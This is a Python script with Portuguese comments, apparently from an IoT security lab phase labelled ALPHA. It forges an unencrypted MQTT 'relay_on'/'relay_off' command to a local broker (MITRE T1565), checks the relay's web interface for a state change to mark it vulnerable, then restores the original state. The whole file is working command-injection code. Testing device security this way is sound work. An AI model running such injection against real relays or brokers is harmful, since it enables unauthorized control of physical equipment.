#!/usr/bin/env python3
"""
relay_inject_ALPHA.py — Injecao de comando de rele PLAINTEXT (sem cifra) — fase ALPHA.
Corre NO gateway desta fase (broker EMQX em localhost:1883, rele em 192.168.100.13:80).
Publica um comando forjado em ALPHA/CC8DA20C7AF8/comando (MITRE ATT&CK T1565) e le o efeito
real no web UI do rele. Injeta o OPOSTO do estado atual e no fim RESTAURA.
Esperado: ACEITE (plaintext, VULNERAVEL).
"""
import json, time, urllib.request, re
import paho.mqtt.client as mqtt

BROKER = "127.0.0.1"
RELAY  = "192.168.100.13"
MAC    = "CC8DA20C7AF8"
PREFIX = "ALPHA"

def client():
    try:
        return mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)   # paho 2.x
    except (AttributeError, TypeError):
        return mqtt.Client()                                   # paho 1.x

def state(ip):
    """1=LIGADO, 0=DESLIGADO, None=erro (le o web UI plaintext do rele)."""
    try:
        h = urllib.request.urlopen(f"http://{ip}/", timeout=6).read().decode(errors="ignore")
        m = re.search(r"relay-state[^>]*>(LIGADO|DESLIGADO)", h)
        return 1 if (m and m.group(1) == "LIGADO") else 0 if m else None
    except Exception:
        return None

def inject(on):
    payload = json.dumps({"command": "relay_on" if on else "relay_off"})  # forjado, SEM cifra
    c = client(); c.connect(BROKER, 1883, 5)
    c.publish(f"{PREFIX}/{MAC}/comando", payload, qos=1)
    c.loop(timeout=1.0); c.disconnect()

print(f"\n>>> Injecao PLAINTEXT no rele {RELAY} (fase {PREFIX}) — esperado: ACEITE (plaintext, VULNERAVEL)\n")
before = state(RELAY)
if before is None:
    raise SystemExit(f"ERRO: rele {RELAY} sem resposta")
target = 0 if before == 1 else 1
print(f"estado antes : {'LIGADO' if before else 'DESLIGADO'}")
print(f"injeta       : {'relay_on' if target else 'relay_off'} (forjado, sem cifra)")
inject(target); time.sleep(3)
after = state(RELAY)
if after == target:
    print("depois       : MUDOU       -> injecao ACEITE   (VULNERAVEL)")
elif after == before:
    print("depois       : sem mudanca -> injecao REJEITADA (SEGURO)")
else:
    print(f"depois       : inesperado (antes={before} depois={after})")
if after not in (None, before):                # restaura se mudou
    inject(before); time.sleep(2)
    print(f"restaurado   : {'LIGADO' if state(RELAY) == 1 else 'DESLIGADO'}")
